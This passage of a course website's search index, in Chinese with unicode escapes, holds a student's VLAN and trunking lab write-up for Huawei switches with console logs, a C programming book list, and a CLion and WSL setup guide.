\u4f60\u9700\u8981\u5728vlanif\u4e0a\u914d\u7f6e\u5b83 \uff0c\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u53c2\u9605\u8fd9\u91cc\uff1a vlanif\u548cvlan\u7684\u533a\u522b \u4ea4\u6362\u673a\u8981ip\u6709\u4ec0\u4e48\u7528\uff1f \u6000\u7591\u6587\u7ae0\u6709\u95ee\u9898\u4e4b\u524d\u6700\u597d\u5148\u786e\u8ba4\u4e00\u4e0b\u81ea\u5df1\u662f\u5426\u5df2\u7ecf\u8bfb\u4e86\u4e0a\u8ff0\u6587\u7ae0 \u63a5\u4e0b\u6765\u6211\u4eec\u8be5\u6765\u914d\u7f6e\u4e00\u4e0bVLAN\u4e86\u3002\u6839\u636e\u8981\u6c42\uff0c\u628aEthernet 0/0/3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u628aEthernet 0/0/4\u5305\u542b\u5230VLAN3\u4e2d\uff1a \u5728VLAN\u4e2d\u6dfb\u52a0\u7aef\u53e3\u4e5f\u662f\u53ef\u884c\u7684\u3002 \u5982\u679c\u9047\u5230\u95ee\u9898\u9700\u8981\u66f4\u6539\u7aef\u53e3\u7c7b\u578b\uff1a \u5982\u679c\u4f60\u4e0d\u660e\u767d\uff0c\u6211\u60f3\u4f60\u5e94\u8be5\u53bb\u641c\u7d22\u4e00\u4e0b\u6709\u5173trunk/access/hybrid\u7684\u5185\u5bb9\u3002 \u53e6\u4e00\u4e2a\u63a5\u53e3\u540c\u7406\uff0c\u90fd\u914d\u7f6e\u597d\u4e4b\u540e\u5e94\u8be5\u80fd\u770b\u5230\u662f\u8fd9\u6837\u7684\uff1a \u8fd9\u4e2a\u65f6\u5019\u5c31\u53ef\u4ee5\u5f00\u59cb\u6d4b\u8bd5\u4e86\uff1a \u7531\u4e8e\u4e24\u4e2aPC\u88ab\u5206\u914d\u5230\u4e86\u4e0d\u540c\u7684VLAN\u4e2d\uff0c\u5e76\u4e14\u6ca1\u6709\u53ef\u8fbe\u8def\u7531\uff0c\u6240\u4ee5\u5b83\u4eec\u4e0d\u80fd\u4e92\u76f8\u901a\u4fe1\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5207\u6362\u5230Xshell\u4e2d\u66f4\u6539VLAN\u5212\u5206\u3002\u7531\u4e8e\u521a\u521a\u7684ping\u5e26\u6709-t\u53c2\u6570\uff0c\u5b83\u4f1a\u4e0d\u505c\u5730\u7ee7\u7eed\u53d1\u9001ping\u5305\u3002\u6211\u4eec\u6765\u628aEthernet 0/0/4\u6539\u5230VLAN2\u4e2d\u770b\u770b\uff1a \u6211\u4eec\u521a\u628aEthernet 0/0/4\u6dfb\u52a0\u5230VLAN2\u540e\u9a6c\u4e0a\u53ef\u4ee5\u770b\u5230\u8fd9\u8fb9\u5df2\u7ecf\u53ef\u4ee5ping\u901a\u4e86\u3002","title":"VLAN\u57fa\u672c\u914d\u7f6e"},{"location":"szu_courses/cn/vlan_lab/#trunking","text":"\u5e0c\u671b\u4f60\u5728\u641e\u8fd9\u4e2a\u4e4b\u524d\u5df2\u7ecf\u6e05\u695a\u5730\u77e5\u9053\u81ea\u5df1\u5728\u505a\u4ec0\u4e48...\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u6211\u89c9\u5f97\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u7740\u53bb\u641c\u4e00\u4e0b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u4e5f\u53ef\u4ee5\u770b\u770b\u5355\u7ebf\u590d\u7528\u3001\u5355\u81c2\u8def\u7531\u4e4b\u7c7b\u7684\u5e94\u7528\uff0c\u6216\u8bb8\u80fd\u6709\u6240\u5e2e\u52a9\uff0c\u800c\u4e14\u8bf4\u4e0d\u5b9a\u5c31\u80fd\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\u7528\u8d77\u6765\u4e86\u5462\uff1f \u6211\u4eec\u5148\u628a\u4e4b\u524d\u521b\u5efa\u7684VLAN\u5148\u90fd\u5220\u6389\uff1a \u8fd9\u4e2a\u65f6\u5019\u8fd8\u662f\u63a5\u7ebf\uff0c\u6309\u7167PPT\u8bf4\u660e\u63a5\u597d\uff1a \u6309\u56fe\u8fde\u63a5\u597d\u5b9e\u9a8c\u8bbe\u5907\uff0cPC1\u3001PC2\u3001PC3\u3001PC4\u7684IP\u5730\u5740\u5206\u522b\u4e3a10.110.10.1\u300110.110.10.2\u300110.110.10.3\u300110.110.10.4\uff0c\u5b50\u7f51\u63a9\u7801\u5747\u8bbe\u7f6e\u4e3a255.255.255.0\u3002\u5efa\u7acbVLAN2\u3001VLAN3\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06PC1\u548cPC3\u6240\u8fde\u7aef\u53e3\u5305\u542b\u5230VLAN3\u4e2d\uff0c\u901a\u8fc7\u914d\u7f6e\u5c06PC2\u548cPC4\u6240\u8fde\u7aef\u53e3\u5305\u542b\u5230VLAN2\u4e2d\uff0c\u5c06\u4e24\u53f0\u4ea4\u6362\u673a\u7684Ethernet 0/23\u7aef\u53e3\u8bbe\u7f6e\u4e3aTrunk\u7aef\u53e3\uff0c\u5e76\u5141\u8bb8\u6240\u6709VLAN\u901a\u8fc7\u3002 \u7531\u4e8e\u8fd9\u4e2a\u4ea4\u6362\u673a\u768422\u597d\u50cf\u662f\u574f\u7684...\u4e8e\u662f\u6362\u5230\u4e8620\u4e0a\uff08\u771f\u662f\u5c34\u5c2c\uff09\u3002\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u5e72\u7684\u4e8b\u60c5\u662f\uff1a \u5c06PC1\u8fde\u63a5\u5230\u4ea4\u6362\u673a1\u7684Ethernet 0/0/3\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.1/24\uff1b \u5c06PC2\u8fde\u63a5\u5230\u4ea4\u6362\u673a1\u7684Ethernet 0/0/12\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.2/24\uff1b \u5c06PC3\u8fde\u63a5\u5230\u4ea4\u6362\u673a2\u7684Ethernet 0/0/13\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.3/24\uff1b \u5c06PC4\u8fde\u63a5\u5230\u4ea4\u6362\u673a2\u7684Ethernet 0/0/20\u4e0a\uff0c\u914d\u7f6e\u9759\u6001IP\u4e3a10.110.10.4/24\uff1b \u627e\u6839\u7f51\u7ebf\u628a\u4ea4\u6362\u673a1\u7684Ethernet 0/0/23\u548c\u4ea4\u6362\u673a2\u7684Ethernet 0/0/23\u8fde\u63a5\u8d77\u6765\u3002 \u5927\u6982\u4f1a\u662f\u8fd9\u4e2a\u6837\u5b50\uff1a \u63a5\u4e0b\u6765\u7ee7\u7eed\u56de\u5230Xshell\u4e0a\u5f00\u59cb\u914d\u7f6e\u4ea4\u6362\u673a\uff0c\u6211\u4eec\u5148\u6765\u6298\u817e\u4ea4\u6362\u673a1\uff1a \u5c06Ethernet 0/0/3\u6dfb\u52a0\u5230VLAN3\u4e2d\uff1b \u5c06Ethernet 0/0/12\u6dfb\u52a0\u5230VLAN2\u4e2d\uff1b \u5c06Ethernet 0/0/23\u914d\u7f6e\u4e3atrunk\u5e76\u5141\u8bb8VLAN\u2154\u7684\u6d41\u91cf\u901a\u8fc7\u3002 \u8fd9\u53f0\u4ea4\u6362\u673a\u7684\u7aef\u53e3\u5c31\u4e0d\u50cf\u60f3\u8c61\u4e2d\u7684\u90a3\u6837\u4e86\uff1a \u597d\u5427...\u539f\u6765\u662f GigabitEthernet0/0/1 \uff0c\u539f\u8c05\u6211\u8fd9\u79cd\u53ea\u4f1a\u7528\u7f51\u4ef6\u90a3\u79cd\u6709\u914d\u7f6e\u7a0b\u5e8f\u7684\u4ea4\u6362\u673a\u7684\u4ebaTAB\u4e86\u534a\u5929... \u8fd9\u91cc\u6dfb\u52a0\u5404\u7aef\u53e3\u5230VLAN\u4e2d\u7684\u547d\u4ee4\u5927\u5bb6\u5e94\u8be5\u90fd\u6e05\u695a\u4e86\uff0c\u4e0d\u518d\u6302\u56fe\u4e86...\u770b\u770btrunk\uff1a \u522b\u5fd8\u4e86\u8fd8\u8981\u5141\u8bb8\u6d41\u91cf\u901a\u8fc7\uff1a \u662f\u4e0d\u662f\u53c8\u60f3\u8bf4\u548cPPT\u91cc\u4e0d\u4e00\u6837\uff1f\u53ef\u662f\u5b98\u65b9\u6587\u6863\u91cc\u53ef\u662f\u6e05\u6e05\u695a\u695a\u5730\u53ea\u6709\u4e0a\u9762\u56fe\u91cc\u90a3\u79cd\u7528\u6cd5\u7684\u54e6\u3002\u81ea\u5df1\u52a8\u624b\uff0c\u4e30\u8863\u8db3\u98df\u5427\u3002 \u68c0\u67e5\u8fc7\u6ca1\u6709\u95ee\u9898\u4e86\u5c31\u53ef\u4ee5\u7ee7\u7eed\u914d\u7f6e\u4ea4\u6362\u673a2\u4e86\uff1a \u5c06Ethernet0/0/13\u6dfb\u52a0\u5230VLAN3\u4e2d\uff1b \u5c06Ethernet0/0/20\u6dfb\u52a0\u5230VLAN2\u4e2d\uff1b \u5c06Ethernet0/0/23\u914d\u7f6e\u4e3atrunk\u5e76\u5141\u8bb8VLAN\u2154\u7684\u6d41\u91cf\u901a\u8fc7\u3002 \u8ddf\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u6211\u5c31\u4e0d\u7d2f\u6b7b\u7d2f\u6d3b\u4e0a\u56fe\u4e86\u3002\u5982\u679c\u4e24\u53f0\u90fd\u914d\u7f6e\u597d\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\uff01\u6839\u636e\u5b9e\u9a8c\u8981\u6c42\uff1a PC1\u548cPC2\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a \u7531\u4e8ePC1\u548cPC2\u4e0d\u5728\u540c\u4e00\u4e2aVLAN\uff0c\u5e76\u4e14\u4e0d\u5b58\u5728\u53ef\u8fbe\u8def\u7531\uff0c\u6240\u4ee5\u4e0d\u80fdping\u901a\u3002 PC1\u548cPC3\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a PC1\u548cPC3\u5728\u540c\u4e00\u4e2aVLAN\u4e2d\uff0c\u5e76\u4e14\u914d\u7f6e\u597d\u4e86trunk\uff0c\u53ef\u4ee5ping\u901a\u3002 PC2\u548cPC4\u4e4b\u95f4\u80fd\u5426ping\u6210\u529f\uff1a \u540c\u4e00VLAN\uff0c\u5e76\u4e14\u6709\u6b63\u786e\u7684trunk\uff0c\u53ef\u4ee5ping\u901a\u3002 \u9644\u52a0\u4e00\u4e2aPC2\u548cPC3\uff1a \u5927\u6982\u8fd9\u6837\u5b50\u5c31\u5706\u6ee1\u5b8c\u6210\u4e86\u3002\u4e0d\u8fc7\u8d70\u4e4b\u524d\u522b\u5fd8\u4e86\u5220\u6389VLAN\uff0c\u7f51\u7ebf\u63d2\u56de\u539f\u4f4d\u4e4b\u7c7b\u7684\u626b\u5c3e\u5de5\u4f5c\u54c8\u3002","title":"Trunking"},{"location":"szu_courses/cn/vlan_lab/#_1","text":"\u4e00\u4e9b\u63a7\u5236\u53f0\u8bb0\u5f55\uff0c\u4ec5\u4f9b\u53c2\u8003\uff0c\u5e76\u4e14\u6709\u6211\u778e\u73a9\u7684\u8bb0\u5f55\u3002\u8bf7\u52a1\u5fc5\u8bb0\u5f97\u770b\u6587\u6863\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 <Quidway>system-view [ Quidway ] interface Vlanif 2 Error: The VLAN does not exist. [ Quidway ] vlan 2 [ Quidway-vlan2 ] quit [ Quidway ] interface Vlanif 2 [ Quidway-Vlanif2 ] ip address 10 .110.10.3 255 .255.255.0 [ Quidway ] undo vlan 2 Error: The VLAN has a L3 interface. Please delete it first. [ Quidway ] vlan 2 [ Quidway-vlan2 ] port Ethernet0/0/3 Error: Trunk or Hybrid port ( s ) cannot be added or deleted in this manner. [ Quidway ] interface Ethernet0/0/3 [ Quidway-Ethernet0/0/3 ] port link-type access [ Quidway-Ethernet0/0/3 ] port default vlan 2 [ Quidway-Ethernet0/0/3 ] display vlan 2 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 2 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/3 ---------------- Interface Physical Ethernet0/0/3 UP 1 2 3 [ Quidway ] interface GigabitEthernet0/0/23 [ Quidway-GigabitEthernet0/0/23 ] port link-type trunk [ Quidway-GigabitEthernet0/0/23 ] port trunk allow-pass vlan all","title":"\u63a7\u5236\u53f0\u8bb0\u5f55"},{"location":"szu_courses/cn/vlan_lab/#_2","text":"\u5b9e\u9a8c\u62a5\u544a \u4ea4\u6362\u673a\u4e0e\u865a\u62df\u5c40\u57df\u7f51 \u8ba1\u7b97\u673a\u7f51\u7edc","title":"\u5173\u952e\u8bcd"},{"location":"szu_courses/cpp/books/","text":"C\u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\uff1a\u73b0\u4ee3\u65b9\u6cd5 C Programming: A Modern Approach \u3010\u7f8e\u3011 K.N.King \u8457\uff0c\u5415\u79c0\u950b\uff0c\u9ec4\u5029 \u8bd1 C Primer Plus \u3010\u7f8e\u3011 Stephen Prata \u8457\uff0c\u59dc\u4f51 \u8bd1 C\u4e13\u5bb6\u7f16\u7a0b Expert C Programming: Deep C Secrets \u3010\u7f8e\u3011 Peter Van Der Linden \u8457\uff0c\u5f90\u6ce2 \u8bd1 C\u9677\u9631\u4e0e\u7f3a\u9677 C Traps and Pitfalls \u3010\u7f8e\u3011 Andrew Koenig \u8457\uff0c\u9ad8\u5dcd \u8bd1 C\u548c\u6307\u9488 POINTERS ON C \u3010\u7f8e\u3011 Kenneth A. Reek \u8457\uff0c\u5f90\u6ce2 \u8bd1 \u5f81\u670dC\u6307\u9488 \u3010\u65e5\u3011 \u524d\u6865\u548c\u5f25 \u8457\uff0c\u5434\u96c5\u660e \u8bd1 \u6211\u8fd8\u4f1a\u9646\u7eed\u66f4\u65b0\u8fd9\u91cc\uff0c\u4f46\u662f\u8fd9\u91cc\u6682\u65f6\u4e0d\u4f1a\u5217\u51faC++\u7684\u4e66\u7c4d\u3002","title":"\u4e00\u4e9bC\u8bed\u8a00\u76f8\u5173\u7684\u4e66\u76ee"},{"location":"szu_courses/cpp/clion_conf/","text":"\u53ef\u80fd\u6709\u4eba\u8981\u95ee\u6211\u4e86\uff1a\u4e3a\u4ec0\u4e48\u8981\u7528\u8fd9\u4e2aIDE\uff1f\u8fd9\u4e48\u590d\u6742\u7684\u5b89\u88c5\u8fc7\u7a0b\u6211\u4e3a\u4ec0\u4e48\u4e0d\u7528Dev-C++\u6216\u8005CodeBlocks\uff1fVC6.0\u591a\u597d\u7528\u554a\uff01 \u8fd9\u4e2a...\u6211\u7684\u56de\u7b54\u662f\uff1aCLion\u786e\u5b9e\u662f\u4e00\u4e2a\u4f18\u79c0\u7684\u3001\u5f3a\u5927\u7684\u8de8\u5e73\u53f0C/C++ IDE\uff1b\u5b89\u88c5\u8fc7\u7a0b\u672c\u8eab\u4e0d\u590d\u6742\uff0c\u5b98\u7f51\u63d0\u4f9b\u4e86\u8be6\u5c3d\u7684\u6587\u6863\uff1b\u6b64\u5916\uff0c\u6309\u7167\u5411\u5bfc\u4e00\u6b65\u6b65\u505a\u4e0b\u6765\u4e5f\u662f\u76f8\u5f53\u7b80\u5355\u7684\uff0c\u5199\u8fd9\u7bc7\u4e3b\u8981\u662f\u56e0\u4e3a...\u5f88\u591a\u540c\u5b66\u771f\u7684\u770b\u5230\u82f1\u6587\u5c31\u5bb3\u6015\uff0c\u5bf9\u6b64\u6211\u53ea\u80fd\u5f15\u7528\u4e00\u4e0b\u8fd9\u6bb5\u8bdd\uff1a \u201c\u82f1\u6587\u5728\u79d1\u5b66\u6280\u672f\u9886\u57df\u662f\u4e16\u754c\u8bed\u201d\u8fd9\u4e2a\u4e8b\u5b9e\u5728\u672a\u6765\u51e0\u5341\u5e74\u90fd\u4e0d\u4f1a\u6539\u53d8\u3002\u6211\u4eec\u5728\u6388\u8bfe\u8fc7\u7a0b\u4e2d\u5e94\u7528\u7684\u975e\u6280\u672f\u8bcd\u6c47\u90fd\u5f88\u7b80\u5355\u3002\u56e0\u6b64\u505c\u6b62\u62b1\u6028\uff0c\u4ee5\u5f00\u653e\u7684\u5fc3\u6001\u6765\u8fce\u63a5\u6311\u6218\u5427\u3002\u4f60\u4f1a\u53d1\u73b0\uff0c\u5176\u5b9e\u6311\u6218\u4e5f\u5e76\u4e0d\u5927\u3002 \u6765\u6e90 \u5b66\u5802\u5728\u7ebf \u300a\u7535\u8def\u539f\u7406\u300b \u4e8e\u6b46\u6770\u6559\u6388 \u6e05\u534e\u5927\u5b66\u7535\u673a\u7cfb \u81f3\u4e8e\u5b83\u7684\u7279\u6027\u548c\u4f18\u70b9\uff0c\u4f60\u53ef\u4ee5\u770b \u8fd9\u91cc \u3002\u5982\u679c\u65b0\u624b\u7684\u4f60\u770b\u4e0d\u61c2\u7684\u8bdd\uff0c\u6211\u5927\u6982\u53ef\u4ee5\u544a\u8bc9\u4f60\u8fd9\u51e0\u70b9\uff1a \u9759\u6001\u4ee3\u7801\u5ba1\u67e5 \u5728\u6784\u5efa\u524d\u5373\u53ef\u77e5\u9053\u4ee3\u7801\u4e2d\u5b58\u5728\u7684\u95ee\u9898\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e00\u4e9b\u6bd4\u8f83\u50bb\u7684\u95ee\u9898\u90fd\u80fd\u5f88\u5feb\u53d1\u73b0\uff0c\u53ef\u4ee5\u8282\u7ea6\u5927\u91cf\u7684\u65f6\u95f4\u3002\u8fd9\u4e9b\u63d0\u793a\u5bf9\u4e8e\u63d0\u9ad8\u4f60\u7684\u4ee3\u7801\u8d28\u91cf\u4e5f\u6709\u5e2e\u52a9\u3002 \u667a\u80fd\u4ee3\u7801\u8865\u5168 \u4f60\u53ef\u4ee5\u5229\u7528\u591a\u79cd\u6280\u672f\u6765\u8fdb\u884c\u8865\u5168\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u8865\u5168\u5173\u952e\u5b57\u3001\u53d8\u91cf\u540d\u6216\u8005\u4f7f\u7528\u6a21\u677f\uff0c\u53ef\u4ee5\u5927\u5e45\u63d0\u9ad8\u7f16\u5199\u7684\u901f\u5ea6\u3002 \u4f60\u53ef\u4ee5\u6bd4\u8f83\u65b9\u4fbf\u5730\u5728\u8003\u8bd5\u673a\u623f\u7684\u7535\u8111\u4e0a\u5b89\u88c5\u5e76\u4f7f\u7528\uff0c\u800c\u4e0d\u9700\u8981\u82b1\u8d39\u5f88\u957f\u65f6\u95f4\uff0c\u7136\u800c\u4f60\u53ef\u80fd\u9700\u8981\u7b49\u5f85\u8f83\u957f\u65f6\u95f4\u624d\u80fd\u628aVisual Studio 2017\uff08\u6216\u8005\u672a\u6765\u7684\u66f4\u9ad8\u7248\u672c\uff09\u90e8\u7f72\u597d\u3002 \u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u6211\u5e76\u4e0d\u6253\u7b97\u628a\u5b98\u7f51\u4e0a\u5df2\u7ecf\u5199\u5f97\u5f88\u597d\u7684\u5b89\u88c5\u548c\u914d\u7f6e\u6559\u7a0b\u518d\u91cd\u590d\u4e00\u904d\uff0c\u91cd\u590d\u9020\u8fd9\u79cd\u8f6e\u5b50\u6ca1\u6709\u610f\u4e49\uff0c\u4f55\u51b5\u6211\u8fd9\u62d9\u52a3\u7684\u6280\u672f\u548c\u6587\u7b14\u4e5f\u4e0d\u89c1\u5f97\u80fd\u5199\u51fa\u66f4\u597d\u7684\u6559\u7a0b\u3002\u6211\u53ea\u4f1a\u5728\u4e0b\u9762\u5217\u51fa\u6587\u6863\u7684\u76f8\u5173\u5730\u5740\u548c\u6211\u88ab\u9891\u7e41\u5730\u95ee\u5230\u7684\u95ee\u9898\u3002 \u7533\u8bf7\u6559\u80b2\u7248\u6388\u6743 \u5b66\u751f\u53ef\u4ee5\u83b7\u53d6\u5230\u514d\u8d39\u7684\u6559\u80b2\u7248\uff0c\u5f53\u7136\uff0c\u4e0d\u80fd\u7528\u4e8e\u5546\u4e1a\u7528\u9014\u3002\u76ee\u524d\uff0c\u4f60\u53ef\u4ee5\u5728JetBrains\u5b98\u65b9\u7f51\u7ad9\u7684\u9996\u9875\u4e0a\u65b9\u5bfc\u822a\u680f\u4e2d\u7684Support\u627e\u5230Education\uff0c\u4f60\u4f1a\u770b\u5230APPLY FOR FREE STUDENT PACK\uff1a \u63d0\u4f9b\u4f60\u7684\u5b66\u751f\u90ae\u7bb1\u5e76\u5b8c\u6210\u7533\u8bf7\uff0c\u4f60\u5c06\u4f1a\u5f97\u52301\u5e74\u7684\u6559\u80b2\u7248\u6388\u6743\u3002\u53ea\u8981\u4f60\u6301\u7eed\u6301\u6709\u5b66\u751f\u90ae\u7bb1\uff0c\u6bcf\u5e74\u5728\u8be5\u8bb8\u53ef\u8bc1\u8fc7\u671f\u524d\u4f60\u90fd\u4f1a\u6536\u5230\u7eed\u671f\u63d0\u9192\u90ae\u4ef6\uff0c\u70b9\u51fb\u8be5\u90ae\u4ef6\u4e2d\u7684\u7eed\u671f\u5373\u53ef\u5b8c\u6210\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u989d\u5916\u64cd\u4f5c\u3002 How can I renew my free educational license for another year? If you're still studying/teaching at a full-time educational program, you can renew your free license for another year. To do so, use the dedicated link in your JetBrains account, or use a link from the automatic email reminder we send out one week before your subscription expires. \u5982\u679c\u4f60\u53ea\u6253\u7b97\u4f7f\u7528JetBrains\u5bb6\u7684CLion\uff0c\u5e76\u4e0d\u6253\u7b97\u4f7f\u7528\u4f8b\u5982\u4e3aJava\u7b49\u51c6\u5907\u7684IntelliJ\u6216\u662f\u4e3aPython\u51c6\u5907\u7684PyCharm\u7b49\u5de5\u5177\uff0c\u90a3\u4e48\u76f4\u63a5\u5355\u72ec\u4e0b\u8f7d\u5e76\u5b89\u88c5CLion\u5373\u53ef\u3002 \u4f46\u5982\u679c\u4f60\u5e0c\u671b\u4f7f\u7528JetBrains\u5bb6\u7684\u591a\u4e2aIDE\uff0c\u90a3\u4e48\u6211\u63a8\u8350\u4f60\u4e0b\u8f7d\u5b89\u88c5JetBrains Toolbox\uff0c\u7136\u540e\u5728Toolbox\u4e2d\u5b89\u88c5\u4f60\u9700\u8981\u7684\u5de5\u5177\u3002\u6709\u5173Toolbox\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u4f60\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u3002 \u914d\u7f6eToolchain \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7b2c\u4e00\u6b21\u8fd0\u884cCLion\u7684\u65f6\u5019\uff0c\u4f1a\u6709\u5411\u5bfc\u6307\u5f15\u4f60\u5b8c\u6210\u5bf9\u4e3b\u9898\u3001\u5de5\u5177\u94fe\uff08Toolchain\uff09\u7b49\u7684\u914d\u7f6e\u3002\u6211\u80fd\u731c\u5230\u5f88\u591a\u540c\u5b66\u7684\u574f\u4e60\u60ef\u5c31\u662f\u4e00\u8defNext\uff0c\u7136\u540e\u8fdb\u5165\u4e86\u4e3b\u754c\u9762\uff0c\u627e\u5230Run\u5c31\u60f3\u5f00\u59cb\u8dd1\u7a0b\u5e8f\uff0c\u7136\u540e\u5c31\u53d1\u73b0\u6839\u672c\u4e0d\u80fd\u7528\uff0c\u5230\u5904\u4e71\u70b9\u534a\u5929\u53d1\u73b0\u89e3\u51b3\u4e0d\u4e86\u4e8e\u662f\u542f\u52a8\u4e86\u5378\u8f7d\u7a0b\u5e8f\u3002\uff08\u644a\u624b.jpg\uff09IDE\u672c\u8eab\u5e76\u6ca1\u6709\u96c6\u6210\u7f16\u8bd1\u5668\uff0c\u4f60\u9700\u8981\u5b89\u88c5\u4e00\u4e2aIDE\u652f\u6301\u7684\u7f16\u8bd1\u5668\uff0c\u7136\u540e\u544a\u8bc9IDE\u8fd9\u4e2a\u7f16\u8bd1\u5668\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u624d\u80fd\u8ba9\u5b83\u8c03\u7528\u3002 \u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u4e3b\u8981\u662f\u9488\u5bf9Windows\u5e73\u53f0\u8bf4\u660e\u7684\uff1a \uff08\u63a8\u8350\uff09 Windows Subsystem for Linux (WSL) on Windows 10 \u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf \u76ee\u524d\uff0c\u8fd9\u662fWindows 10\u6216\u8005Windows Server 2019\u4e0a\u7684\u529f\u80fd\u3002\u66f4\u591a\u4fe1\u606f\u4f60\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u3002 \u5177\u4f53\u7684\u914d\u7f6e\u65b9\u6cd5\u4f60\u53ef\u4ee5\u770b\u5b98\u65b9\u7684\u6587\u6863\uff1a WSL - Help | CLion - JetBrains \u3002 \u8fd9\u53ef\u80fd\u662f\u5f53\u524d\u5728Windows\u4e0a\u8f83\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6709\u76f8\u5bf9\u8f83\u9ad8\u7684\u7f16\u8bd1\u901f\u5ea6\u3001\u63d0\u793a\u901f\u5ea6\uff0c\u5e76\u4e14\u66f4\u91cd\u8981\u7684\u662fIDE\u96c6\u6210\u7684\u63a7\u5236\u53f0\u4e0a\u8f93\u5165\u8f93\u51fa\u90fd\u662f\u6bd4\u8f83\u6b63\u5e38\u7684\uff08\u5982\u679c\u4f60\u4f7f\u7528\u8fc7MinGW\u4f5c\u4e3a\u5de5\u5177\u94fe\u4e00\u6bb5\u65f6\u95f4\u7684\u8bdd\u5c31\u4f1a\u6709\u8fd9\u79cd\u611f\u53d7\uff09\u3002 \u5e38\u89c1\u95ee\u9898 \u6211\u5df2\u7ecf\u5728\u5e94\u7528\u5546\u5e97\u91cc\u4e0b\u8f7d\u4e86Ubuntu\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48\u6253\u5f00Ubuntu\u540e\u4e0d\u80fd\u7528\uff1f\u5b83\u63d0\u793a\uff1aThe Windows Subsystem for Linux optional component is not enabled. Please enable it and try again. \u8fd9\u4e2a...\u4eba\u5bb6\u8bf4\u5f97\u5f88\u660e\u767d\u4e86\u3002\u4f60\u6ca1\u6709\u5728Windows\u4e2d\u542f\u7528WSL\u529f\u80fd\uff0c\u4f60\u5e94\u8be5\u5728 \u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd \u4e2d\u6253\u5f00\u5b83\u3002\u5982\u679c\u4f60\u627e\u4e0d\u5230\u5b83\u7684\u8bdd...\u5b83\u5177\u4f53\u5728 \u63a7\u5236\u9762\u677f->\u7a0b\u5e8f->\u542f\u7528\u6216\u5173\u95edWindows\u529f\u80fd->\u9002\u7528\u4e8eLinux\u7684Windows\u5b50\u7cfb\u7edf \u91cc\u3002\u4ec0\u4e48\uff1f\u4f60\u8bf4\u4f60\u4e0d\u77e5\u9053Windows\u7684\u63a7\u5236\u9762\u677f\u5728\u54ea\u91cc\uff1f\u6211\u60f3\u4f60\u5e94\u8be5\u5148\u5b66\u4f1a\u5982\u4f55\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u3002 \u6211\u5df2\u7ecf\u6309\u7167\u4e0a\u9762\u7684\u7b54\u6848\u542f\u7528\u4e86WSL\u529f\u80fd\uff0c\u4f46\u662f\u518d\u6b21\u6253\u5f00Ubuntu\u8fd8\u662f\u6ca1\u6709\u53d8\u5316\uff1f \u4f60\u91cd\u542f\u4e86\u5417\uff1f Ubuntu\u662f\u88c5\u597d\u4e86\uff0c\u4f46\u662f\u6211\u8fd8\u662f\u4e0d\u80fd\u4f7f\u7528CLion\uff0c\u6253\u5f00Toolchain\u8bbe\u7f6e\u540e\uff0c\u6709\u5f88\u591a\u7ea2\u8272\u7684\u9519\u8bef\uff0c\u6bd4\u5982\uff1aCannot establish connection\u3002 \u4f60\u662f\u5426\u5df2\u7ecf\u6309\u7167\u4e0a\u8ff0\u5b98\u65b9\u6587\u6863\u4e2d\u6240\u8981\u6c42\u7684\u5185\u5bb9\u8fdb\u884c\u4e86\u76f8\u5e94\u7684\u64cd\u4f5c\uff1f\u5f53\u4f60\u6267\u884c sudo apt install cmake gcc gdb \u524d\u4f60\u53ef\u80fd\u9700\u8981\u5148\u6267\u884c sudo apt update \u548c sudo apt upgrade \u3002\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\uff1a\u6211\u53d1\u73b0\u6709\u540c\u5b66\u6267\u884c\u4e86\u5b89\u88c5\u547d\u4ee4\u540e\u6ca1\u6709\u6ce8\u610f\u5230\u6210\u529f\u4e0e\u5426\u5c31\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u540e\u7eed\u5e26\u6765\u4e00\u4e9b\u9519\u8bef\uff0c\u5982\u679c\u4f60\u6240\u5728\u7684\u7f51\u7edc\u73af\u5883\u8f83\u4e3a\u6076\u52a3\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4ee3\u7406\u3002\u6b64\u5916\uff0c\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u5b98\u65b9\u6587\u6863\u4e2d\u7684\u5b89\u88c5\u811a\u672c\uff0c\u4f60\u7684SSH\u7aef\u53e3\u53f7\u53ef\u80fd\u662f22